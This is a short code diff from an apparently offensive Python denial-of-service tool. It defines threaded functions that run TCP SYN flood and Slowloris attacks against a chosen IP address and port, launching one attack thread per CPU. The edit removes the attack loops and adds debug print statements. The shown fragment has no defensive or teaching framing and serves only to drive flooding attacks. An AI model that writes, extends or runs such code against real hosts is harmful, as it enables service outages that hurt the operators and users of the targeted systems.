@@ -9,20 +9,21 @@ import slowloris as sls
 def tcp_attack(ip,port):
 	#print("called")
 	#substitude with actual attack
-	while 1:
-		tsd.TCP_SYN(ip,port)
-		print("TCP:Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))
+	tsd.TCP_SYN(ip,port)
+	print("TCP:Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))
 
 def slowloris_attack(ip,port):
-	while 1:
-		sls.start_slowloris(ip,port,1000)
-		print("Slowloris: Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))
+	sls.start_slowloris(ip,port,1000)
+	print("Slowloris: Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))
 
 def enable_threading_attack_tcp(num_cpu,ip,port):
+	print("enable: {}".format(num_cpu))
 	for _ in range(num_cpu):
 		t = threading.Thread(target=tcp_attack,args=(ip,port,))
-		t.daemon = True
+		#t.daemon = True
+		print("start")
 		t.start()
+		print("not start")
 
 def enable_threading_attack_http(num_cpu,ip,port):
 	for _ in range(num_cpu):
